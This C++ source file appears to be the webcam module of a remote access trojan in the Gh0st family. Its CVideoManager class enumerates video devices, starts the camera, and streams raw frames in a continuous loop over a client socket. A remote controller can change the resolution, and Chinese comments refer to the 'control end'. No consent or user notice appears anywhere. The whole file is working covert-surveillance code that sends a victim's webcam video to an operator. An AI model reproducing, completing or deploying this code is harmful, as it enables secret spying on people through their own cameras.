// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "VideoManager.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
	m_bIsWorking = TRUE;
	m_pCapVideo = NULL;
	m_nDevicesNum = 0;

	m_nVedioWidth = 0;
	m_nVedioHeight = 0;

	m_nOldWidth = 320; // 默认分辨率 320 x 240
	m_nOldHeight = 240;

	m_SelectedDevice = 0;
	m_SelectedOld = 0;

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);

	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	Destroy();
}
void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{	
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_RESIZE:
		m_SelectedDevice = *((LPDWORD)(lpBuffer + 9));
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}
}
// 更改分辨率
void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	// 更新视频大小
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;
	
	InterlockedExchange((LPLONG)&m_bIsWorking, TRUE);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
}

bool CVideoManager::Initialize()
{
	if (m_pCapVideo == NULL)
		m_pCapVideo = new CCaptureVideo();
	
    if (m_pCapVideo == NULL)
        return false;

	 m_DeviceList = "";

	 DeviceInfo devInfo;
	 // 枚举视频设备
	 if (0 >= (m_nDevicesNum = m_pCapVideo->EnumDevices(&devInfo)))
	 {
		 delete m_pCapVideo;
		 m_pCapVideo = NULL;
		 return false;
	 }

	 // 构造驱动信息数据
	 DeviceInfo* pInfo = &devInfo;
	 while(pInfo)
	 {
		 m_DeviceList += pInfo->friendlyName.GetBuffer();
		 m_DeviceList += "#";
		 ResolutionInfo* pResInfo = pInfo->resInfo;
		 while(pResInfo)
		 {
			 m_DeviceList+=pResInfo->Resolution.GetBuffer();
			 pResInfo = pResInfo->next;
		 }
		 m_DeviceList+="$";
		 pInfo = pInfo->next;
	 }

	 // 设置分辨率
	 if (m_nVedioWidth && m_nVedioHeight)//如果是更改分辨率的初始化
	 {
		 if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,m_nVedioWidth,m_nVedioHeight))
		 {
			 m_pCapVideo->Stop();
			 m_pCapVideo->Start(m_SelectedOld,NULL,m_nOldWidth,m_nOldHeight);
			 return true;
		 }
	 }
	 else//如果是第一次启动程序
	 {
		 m_nOldWidth = m_nVedioWidth = 320;
		 m_nOldHeight = m_nVedioHeight = 240;
		 if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,320,240))
		 {
			 m_pCapVideo->Stop();
			 for(int i = 0;i < m_nDevicesNum;i++)
			 {
				 if(S_OK == m_pCapVideo->Start(i,NULL,320,240))
				 {
					 m_SelectedDevice = i;
					 m_SelectedOld = i;
					 m_nOldWidth = m_nVedioWidth = 320;
					 m_nOldHeight = m_nVedioHeight = 240;
					 return true;
				 }
				 m_pCapVideo->Stop();
			 }
			 return false;
		 }
	 }
	 
	 m_nOldWidth = m_nVedioWidth;
	 m_nOldHeight = m_nVedioHeight;
	 
	 m_SelectedOld = m_SelectedDevice;

   	return true;
}

void CVideoManager::Destroy()
{
	if (m_pCapVideo)
	{
		m_pCapVideo->Stop();	
        delete m_pCapVideo;
        m_pCapVideo = NULL;
	}
}

void CVideoManager::sendBITMAPINFO()
{                       //包头 + 位图信息          +视频个数     + 视频信息
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO) + sizeof(int) + m_DeviceList.length();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL || m_pCapVideo == NULL)
		return;
	
	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	
	memcpy(lpBuffer + 1, m_pCapVideo->GetBmpInfo(), sizeof(BITMAPINFO));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO),&m_nDevicesNum,sizeof(int));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO) + sizeof(int),m_DeviceList.c_str(),m_DeviceList.length());
	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;	
}

// 注意！ 此数据包有一无用数据标记
void CVideoManager::sendNextScreen()
{
	DWORD  dwBmpImageSize = 0;
	LPVOID	lpDIB =m_pCapVideo->GetDIB(dwBmpImageSize); 
	if (lpDIB == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 ;
	UINT	nBufferLen = nHeadLen + dwBmpImageSize;//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;

	memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);

	Send(lpBuffer, nBufferLen);
    m_pCapVideo->SendEnd();

	delete [] lpBuffer;
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	CVideoManager *pThis = (CVideoManager *)lparam;
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
    }
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	pThis->WaitForDialogOpen();
	while (pThis->m_bIsWorking)
	{
		pThis->sendNextScreen();
	}
	// 销毁已经存在实例，方便重新调整
	pThis->Destroy();
	return 0;
}